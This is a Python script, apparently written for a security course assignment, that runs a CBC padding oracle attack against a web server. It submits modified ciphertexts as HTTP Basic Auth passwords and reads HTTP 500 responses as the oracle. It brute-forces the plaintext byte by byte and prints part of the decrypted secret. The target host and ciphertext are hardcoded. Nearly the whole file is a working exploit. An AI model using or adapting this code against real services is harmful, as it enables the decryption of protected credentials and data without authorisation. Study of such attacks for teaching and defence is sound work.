#python script to do padding oracle attack
import requests
from requests.auth import HTTPBasicAuth
import codecs

host =  'http://project-2.csec.chatzi.org:8000/' 
user = 'admin' 
cypher = '8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96'
#pico:
# python3 task2.py http://127.0.0.1:8000/ test 029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57

#chatz:
# python3 task2.py http://project-2.csec.chatzi.org:8000 admin 8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96

byte_number = 16
IV = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

print("\n\n\n============================================== TASK 2 ==============================================\n\n")

def oracle(host, cypher):
    try:
        response = requests.get(host, auth = HTTPBasicAuth(user, cypher.hex()))
        if response.status_code != 500:
            return True
        else:
            return False
    except:
        #retry if request fails.
        response = requests.get(host, auth = HTTPBasicAuth(user, cypher.hex()))
        if response.status_code != 500:
            return True
        else:
            return False

def padding_attack(encrypted):
    block_number = len(encrypted)//byte_number
    decrypted = bytes()

    # Go through each block
    for i in range(block_number, 0, -1):
        print("block", i)
        current_encrypted_block = encrypted[(i-1)*byte_number:(i)*byte_number]
        # At the first encrypted block, use the initialization vector if it is known
        if(i == 1):
            previous_encrypted_block = bytearray(IV.encode("ascii"))
        else:
            previous_encrypted_block = encrypted[(i-2)*byte_number:(i-1)*byte_number]
        bruteforce_block = previous_encrypted_block
        current_decrypted_block = bytearray(IV.encode("ascii"))
        padding = 0
        
        # Go through each byte of the block
        for j in range(byte_number, 0, -1):
            padding += 1
            # Bruteforce byte value
            for value in range(0,256):
                bruteforce_block = bytearray(bruteforce_block)
                bruteforce_block[j-1] = (bruteforce_block[j-1] + 1) % 256
                joined_encrypted_block = bytes(bruteforce_block) + current_encrypted_block
                # Ask the oracle
                if(oracle(host, joined_encrypted_block)):
                    current_decrypted_block[-padding] = bruteforce_block[-padding] ^ previous_encrypted_block[-padding] ^ padding
                    # Prepare newly found byte values
                    for k in range(1, padding+1):
                        bruteforce_block[-k] = padding+1 ^ current_decrypted_block[-k] ^ previous_encrypted_block[-k]
                    break
        decrypted = bytes(current_decrypted_block) + bytes(decrypted)
    return decrypted[:-decrypted[-1]]  # Padding removal


decr = padding_attack(bytes.fromhex(cypher))
decr = decr.hex()
plaintext = ''
for i in range(0,len(decr),2):
    try:
       plaintext = plaintext + codecs.decode(decr[i]+decr[i+1],"hex").decode("ASCII")
    except:
        continue

print(plaintext[-12:])